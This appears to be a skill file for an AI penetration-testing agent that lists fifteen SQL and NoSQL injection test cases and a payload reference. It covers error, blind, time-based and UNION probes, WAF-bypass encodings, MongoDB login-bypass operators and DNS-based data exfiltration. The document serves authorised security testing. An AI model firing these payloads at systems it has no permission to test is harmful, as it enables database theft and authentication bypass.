# SQL Injection Hunting Skill — 15 Test Cases

> Load when: SQLi, SQL injection, database error, blind SQLi.

## 26. Error-based SQLi probe (easy)
For each parameter (GET, POST, JSON body, headers), append `'`, `"`, `\`, `')`, `'))`. Diff responses. Report parameters that emit SQL errors or 500s differing from baseline.

## 27. Boolean-based blind SQLi (medium)
Send `' AND 1=1-- -` and `' AND 1=2-- -`. If responses differ deterministically, confirm blind SQLi and extract DB version.

## 28. Time-based blind SQLi (medium)
Send `' AND SLEEP(5)-- -` (MySQL), `'; WAITFOR DELAY '0:0:5'-- ` (MSSQL), `' AND pg_sleep(5)-- -` (Postgres). Compare response times.

## 29. UNION-based SQLi column count (medium)
Use `ORDER BY 1--`, `ORDER BY 2--`, ... until error, then `UNION SELECT NULL,NULL,...` to identify column count and reflected column.

## 30. Second-order SQLi (hard)
Inject `' || (SELECT version())-- ` into fields stored then later used in queries (username, file path, log message). Trigger the second query.

## 31. SQLi via ORDER BY / column names (medium)
Test injection in sort parameters (`?sort=name`). Try `name,(CASE WHEN 1=1 THEN 1 ELSE 2 END)`.

## 32. NoSQL injection in MongoDB (easy)
Send `{"$ne": null}`, `{"$gt": ""}`, `{"$regex": ".*"}` in JSON login fields. Report auth bypass.

## 33. SQLi via JSON parameters (medium)
If API accepts `{"filter": {"id": 1}}`, replace value with `{"$gt": 0}` (NoSQL) or `"1 OR 1=1"` (SQL passthrough).

## 34. Out-of-band SQLi via DNS (hard)
On MySQL with `LOAD_FILE` or MSSQL with `xp_dirtree`, exfil data through DNS lookups to Burp Collaborator domain.

## 35. SQLi in stored procedures (hard)
If parameters feed into stored procs, test `'; EXEC sp_who-- ` (MSSQL) and provider-specific escapes.

## 36. SQLi via header values (medium)
Test `User-Agent`, `X-Forwarded-For`, `Referer` for SQLi. Common in logging/analytics tables.

## 37. SQLi in LIMIT / OFFSET (hard)
Inject `1 PROCEDURE ANALYSE()` after LIMIT in MySQL; test `OFFSET (SELECT...)` patterns.

## 38. SQLi via WAF bypass (hard)
If WAF blocks `UNION SELECT`, try `/**/UNION/**/SELECT`, `%23%0A`, comments inside keywords, case variation, Unicode normalization.

## 39. SQLi in INSERT path (hard)
Find places where user input becomes part of INSERT (signup, comment). Test `', (SELECT version()))-- -` patterns.

## 40. SQLi via XML body (medium)
If endpoint accepts XML, inject SQL into XML element values and attributes — these often skip JSON sanitizer.

---

## Payload Reference
### Error-Based
`' OR '1'='1'--`, `' UNION SELECT 1,2,3--`, `' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--`

### Boolean Blind
`' AND 1=1--`, `' AND 1=2--`, `' AND LENGTH(database())=8--`

### Time-Based
`' AND SLEEP(5)--`, `'; WAITFOR DELAY '0:0:5'--`, `' AND pg_sleep(5)--`

### UNION
`' ORDER BY 10--`, `' UNION SELECT NULL,NULL,NULL--`

### WAF Bypass
`/**/UNION/**/SELECT`, `UNION%09SELECT`, `/*!50000UNION*/`
